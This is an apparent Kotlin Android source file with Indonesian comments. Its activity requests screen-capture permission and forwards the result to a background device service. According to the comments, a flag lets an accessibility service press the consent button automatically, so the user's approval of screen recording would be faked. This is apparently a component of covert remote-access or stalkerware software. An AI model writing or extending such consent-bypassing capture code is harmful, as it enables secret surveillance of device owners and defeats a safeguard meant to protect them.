package com.fantzy.nih

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle

class ScreenCaptureActivity : Activity() {

    companion object {
        private const val REQ_SCREEN = 1001
        
        // Flag untuk memicu Accessibility Service agar menekan tombol otomatis
        @Volatile
        var isWaitingForScreenCapture = false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Set flag menjadi true saat popup akan muncul
        isWaitingForScreenCapture = true

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        @Suppress("DEPRECATION")
        startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        // Set flag kembali ke false setelah dapat hasilnya
        isWaitingForScreenCapture = false

        if (requestCode == REQ_SCREEN) {
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Fail-safe: pastikan flag direset jika activity dihancurkan
        isWaitingForScreenCapture = false
    }
}